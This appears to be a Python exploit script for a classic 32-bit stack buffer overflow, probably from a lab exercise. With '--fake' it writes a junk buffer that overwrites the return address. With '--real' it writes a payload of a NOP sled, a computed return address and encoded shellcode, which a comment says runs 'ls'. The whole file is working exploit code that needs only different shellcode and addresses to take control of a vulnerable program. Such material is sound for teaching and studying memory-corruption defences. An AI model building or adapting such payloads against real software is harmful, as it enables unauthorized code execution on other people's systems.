import argparse

# Fake payload: Overwrite the return address with junk data
def over_write_ret():
    buffer_size = 256
    payload = "A" * buffer_size + "BBBB" +"CCCC" +"DDDD"+"EEEE"
    with open('fake_payload', 'w') as f:
        f.write(payload)

# Real payload: Overwrite the return address with shellcode address
def over_write_ret_with_shellcode():
    # Shellcode to execute ls
    shellcode = ("\xbe\xc0\x78\x18\x8e\xdb\xcc\xd9\x74\x24\xf4\x58\x31\xc9"
                "\xb1\x0b\x31\x70\x15\x03\x70\x15\x83\xc0\x04\xe2\x35\x12"
                "\x13\xd6\x2c\xb1\x45\x8e\x63\x55\x03\xa9\x13\xb6\x60\x5e"
                "\xe3\xa0\xa9\xfc\x8a\x5e\x3f\xe3\x1e\x77\x37\xe4\x9e\x87"
                "\x67\x86\xf7\xe9\x58\x2a\x74\xf6\xf1\xe1\xf3\x17\x30\x85"
                 ).encode('latin-1')
                 
    shellcode_size = len(shellcode) # Calculates the length of the shellcode
    
    # Buffer Details -----
    buffer_size = 256
    buffer_address =  0xffffd420 # Use your own buffer address
    
    # NOPS
    nops = 200

    # EBP and return address details -------
    offset = 100
    ebp_address = 0xffffd528  # Use your own EBP address
    # Distance between buffer and EBP
    buff_dist = ebp_address - buffer_address 
    print(f"[+] Distance between Buffer and EBP: {int(buff_dist)}")
    return_address = ebp_address + offset
    print(f"[+] Return Address: {hex(return_address)}")
    encoded_ret_address = return_address.to_bytes(4, byteorder='little')
    print(f"[+] Return Address: {encoded_ret_address}")
    
    # Build exploit buffer content
    content = bytearray(0x90 for _ in range(int(buff_dist) + 4))  # NOP sled 
    # content += b"\x41" * 4  # Add NOPs
    content += encoded_ret_address
    content += b"\x90" * nops  # Add NOPs
    content += shellcode

    print(f"[+] Shellcode length: {len(shellcode)}")
    print(f"[+] Payload length: {len(content)}")

    with open('real_payload', 'wb') as f:
        f.write(content)



if __name__ == "__main__":
    argp = argparse.ArgumentParser()
    argp.add_argument("--fake", help="Create a fake payload", action="store_true")
    argp.add_argument("--real", help="Create a real payload", action="store_true")
    args = argp.parse_args()

    if args.fake:
        over_write_ret()
        print("[+] Fake payload created")
    elif args.real:
        over_write_ret_with_shellcode()
        print("[+] Real payload with shellcode created")
    else:
        print("Usage: python3 exploit.py --fake | --real")
        exit(0)
